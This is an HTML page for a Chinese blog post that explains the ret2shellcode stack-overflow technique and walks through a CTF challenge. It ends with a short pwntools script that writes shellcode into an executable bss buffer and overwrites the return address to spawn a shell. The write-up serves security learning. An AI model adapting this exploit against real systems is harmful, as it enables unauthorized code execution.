@@ -1,0 +1,338 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="二进制,栈溢出,Pwn,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>栈溢出之ret2shellcode [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        栈溢出之ret2shellcode
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2019-03-03T10:52:58.000Z">
+        2019-03-03
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/">Pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/二进制/">二进制</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/栈溢出/">栈溢出</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
+
+    <div class="post-content">
+      <h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>ret2shellcode，即控制程序执行shellcode代码——<strong>修改函数返回地址，让其指向溢出数据中的一段指令</strong>。</p>
+<p>shellcode指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。另外，要想执行 shellcode，需要shellcode所在的区域具有可执行权限。</p>
+<p>ret2shellcode的实现在于：在溢出数据内包含一段攻击指令，用攻击指令的起始地址覆盖掉返回地址。</p>
+<blockquote>
+<p><strong>payload :</strong> padding1 + address of shellcode + padding2 + shellcode</p>
+</blockquote>
+<p><img src="/2019/03/03/栈溢出之ret2shellcode/1.png" alt=""></p>
+<p>padding1 处的数据可以随意填充（注意如果利用字符串程序输入溢出数据不要包含 “\x00” ，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of shellcode 是后面 shellcode 起始处的地址，用来覆盖返回地址。padding2 处的数据也可以随意填充，长度可以任意。shellcode 应该为十六进制的机器码格式，但有个前提是shellcode所在的代码段需要具有可执行权限。</p>
+<p><strong>一个问题——shellcode地址如何确定？</strong></p>
+<p>我们可以在调试工具里查看返回地址的位置（可以查看 ebp 的内容然后再加4（32位机）），可是在调试工具里的这个地址和正常运行时并不一致，这是运行时环境变量等因素有所不同造成的。所以这种情况下我们只能得到大致但不确切的 shellcode 起始地址，<strong>解决办法是在 padding2 里填充若干长度的 “\x90”</strong>。这个机器码对应的指令是 NOP (No Operation)，也就是告诉 CPU 什么也不做，然后跳到下一条指令。<strong>有了这一段 NOP 的填充，只要返回地址能够命中这一段中的任意位置，都可以无副作用地跳转到 shellcode 的起始处，所以这种方法被称为 NOP Sled</strong>。这样我们就可以通过增加 NOP 填充来配合试验 shellcode 起始地址。</p>
+<p>操作系统可以将函数调用栈的起始地址设为随机化（这种技术被称为内存布局随机化，即ASLR），这样程序每次运行时函数返回地址会随机变化。反之如果操作系统关闭了上述的随机化（这是技术可以生效的前提），那么程序每次运行时函数返回地址会是相同的，这样我们可以通过输入无效的溢出数据来生成core文件，再通过调试工具在core文件中找到返回地址的位置，从而确定 shellcode 的起始地址。</p>
+<p>最后可以拼接出最终的溢出数据，输入至程序来执行 shellcode 了：</p>
+<p><img src="/2019/03/03/栈溢出之ret2shellcode/2.png" alt=""></p>
+<p>这种方法生效的一个前提是在函数调用栈上的数据（shellcode）要有可执行的权限（另一个前提是上面提到的关闭内存布局随机化）。很多时候操作系统会关闭函数调用栈的可执行权限，这样 shellcode 的方法就失效了，不过我们还可以尝试使用内存里已有的指令或函数，毕竟这些部分本来就是可执行的，所以不会受上述执行权限的限制。这就包括ret2libc等其他的ROP方法。</p>
+<p><strong>前提条件</strong></p>
+<p>由前面分析可知，ret2shell这项技术的前提是需要操作系统关闭内存布局随机化（ASLR）以及需要程序调用栈有可执行权限。</p>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>运行程序，提示这次没有system()给你直接调用，且文件是动态链接的：</p>
+<p><img src="/2019/03/03/栈溢出之ret2shellcode/3.png" alt=""></p>
+<p><img src="/2019/03/03/栈溢出之ret2shellcode/4.png" alt=""></p>
+<p>checksec可以看出源程序没有开启任何保护：</p>
+<p><img src="/2019/03/03/栈溢出之ret2shellcode/5.png" alt=""></p>
+<p>IDA打开查看，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到buf2处，简单地说，就是程序允许用户输入一段内容，然后程序将该内容复制到buf2中：</p>
+<p><img src="/2019/03/03/栈溢出之ret2shellcode/6.png" alt=""></p>
+<p>点击查看可知buf2在bss段：</p>
+<p><img src="/2019/03/03/栈溢出之ret2shellcode/7.png" alt=""></p>
+<p>string窗口确实如题目所示，没有直接提供system(“/bin/sh”)给我们调用了：</p>
+<p><img src="/2019/03/03/栈溢出之ret2shellcode/8.png" alt=""></p>
+<p>为了明确是否可以将shellcode写入buf2中执行，通过vmmap可以看到bss段对应的地址具有可执行权限（先main下断点、r再vmmap）：</p>
+<p><img src="/2019/03/03/栈溢出之ret2shellcode/9.png" alt=""></p>
+<p>可以看到，buf2变量所在的bss段是可读可写可执行的，因此这里可以输入shellcode、然后程序将shellcode复制至此处，最后在函数返回地址处踩掉该地址跳转至buf2执行shellcode。整个过程即为ret2shellcode原理。</p>
+<p>使用GDB pattern字符串溢出计算变量v4到函数返回地址的偏移量为112，即0x70：</p>
+<p><img src="/2019/03/03/栈溢出之ret2shellcode/11.png" alt=""></p>
+<p>编写payload，使用pwntools的asm(shellcraft.sh())可以直接简便地生成汇编代码形式的反弹shell的shellcode：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2shellcode"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x0804a080</span></span><br><span class="line">payload = flat([shellcode.ljust(<span class="number">0x70</span>, <span class="string">"A"</span>), buf2_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>运行直接getshell：</p>
+<p><img src="/2019/03/03/栈溢出之ret2shellcode/10.png" alt=""></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/25816426" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃（上）</a></p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop/#ret2shellcode" target="_blank" rel="noopener">ret2shellcode</a></p>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2shellcode"><span class="toc-text">ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解题过程"><span class="toc-text">解题过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2019/03/03/ROP之ret2text/" rel="next" title="ROP基础及栈溢出之ret2text">
+          ROP基础及栈溢出之ret2text
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2019/03/03/栈溢出之ret2syscall/" rel="prev" title="栈溢出之ret2syscall">
+            栈溢出之ret2syscall
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
